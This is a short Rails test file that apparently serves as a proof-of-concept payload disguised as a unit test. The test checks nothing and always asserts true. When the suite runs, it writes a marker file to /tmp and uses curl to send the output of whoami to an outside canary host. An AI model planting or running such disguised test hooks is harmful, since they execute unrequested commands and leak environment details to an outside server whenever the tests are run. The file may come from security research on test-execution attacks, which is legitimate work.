require 'test_helper'

class PayloadTest < ActiveSupport::TestCase
  test "payload" do
    # Try to execute a command and write to a file
    puts "PAYLOAD EXECUTED!"
    system("echo 'PAYLOAD_EXECUTED' > /tmp/payload.txt")
    system("curl -s https://canary.domain/$(whoami) || true")
    assert true
  end
end